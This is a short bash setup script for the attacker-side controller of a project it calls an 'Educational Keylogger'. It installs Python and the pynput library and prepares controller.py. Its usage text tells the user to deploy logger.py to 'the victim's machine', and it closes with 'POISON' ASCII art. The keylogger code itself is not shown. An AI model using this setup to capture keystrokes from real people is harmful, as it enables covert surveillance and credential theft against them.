#!/bin/bash

# Setup script for the attacker’s machine (controller only)

echo "Setting up the controller for the Educational Keylogger project..."

# Step 1: Update and install dependencies
echo "Updating package lists and installing Python3 and pip..."
sudo apt update -y
sudo apt install -y python3 python3-pip

# Step 2: Install required Python libraries
echo "Installing required Python libraries..."
pip3 install pynput

# Step 3: Set executable permissions for the controller script
echo "Setting executable permissions for controller.py..."
chmod +x controller.py

# Step 4: Display usage instructions
echo "Setup complete for the attacker’s machine!"
echo ""
echo "To start the controller server:"
echo "   python3 controller.py"
echo ""
echo "Deploy logger.py manually to the victim's machine and run it there."
echo ""
cat << "EOF"
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................


                              __
                              XX
_________        ______       ~~     _______         ______      ___.    ___.
XXXXXXXXX.     ,gXXXXXX.      XX    ,XXXXXXXs      ,gXXXXXX.     XXXi    XXX
XXXXXXXXXX.  ,dXXXXXXXXXs     XX   iXXXXXXXXXi    iXXXXXXXXXX_   XXXb    XXX
XXX~~~XXXXX  XXXXX~ ~~XXXX.   XX  XXXX~   XXXX   iXXXX~`'~XXXXi  XXXXs   XXX
XXX    dXXX  XXX       XXXX   XX  XXXXXs_  '~~   XXX`      XXXX  XXXXXb !XXX
XXX___XXXXX iXXX!       XXX   XX   XXXXXXXXXs   iXXX        XXX  XXX XXi XXX
XXXXXXXXXX`  XXX.       XXX   XX    ~XXXXXXXXX   XXX        XXX  XXX'XXX XXX
XXXXXXXXX`   XXX       XXXX   XX  ____ '~XXXXXb  XXX       XXXX  XXX !XXbXXX
XXX          XXXb     gXXX!   XX  XXXX      XXX  XXXb     gXXX   XXX  'XXXXX
XXX          XXXXXXXXXXXXf    XX  ~XXXXX_gXXXX!  'XXXXXXXXXXXX`  XXX   !XXXX
XXX           ~XXXXXXXXX`     XX    XXXXXXXXX~    'XXXXXXXXX`    XXX    XXXX
~~~              ~~X~~`      '~~`     XXXXX~         ~~X~~`      ~~~    '~~~`
                   ~                  ~~~~~            ~

EOF
